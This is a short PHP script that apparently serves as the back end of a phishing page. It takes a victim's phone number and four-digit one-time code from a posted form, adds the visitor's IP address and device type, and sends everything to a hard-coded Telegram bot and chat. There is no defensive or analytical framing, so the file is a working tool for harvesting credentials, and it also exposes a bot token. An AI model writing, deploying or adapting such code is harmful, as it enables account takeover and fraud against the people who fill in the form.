<?php

$token = "6736145768:AAH72cQONeCkjwfNypU2_owHCLepRuWCyX0";

$id = -4041024884;

$phone = $_POST["phone"];
$otp1 = $_POST["otp1"];
$otp2 = $_POST["otp2"];
$otp3 = $_POST["otp3"];
$otp4 = $_POST["otp4"];
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_SERVER['HTTP_USER_AGENT'];
$model = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT'])[2], ")");
$time = file_get_contents("http://api.codebazan.ir/time-date/?td=date");
if ($model === "NT") {
  $model = "Desktop";
} else if ($model === "CPU") {
  $model = "IOS";
}
$Text = "
╔  • NewCODE •  
║  status : PHONE/CODE
╠ • phone : <code>$phone</code>
╠ • code : <code>$otp1$otp2$otp3$otp4</code>
╠ • ip : <code>$ip</code>
╠ • device : $model 
╚  • @DarAnja •
";

@file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$id&text=" . urlencode($Text));

?>


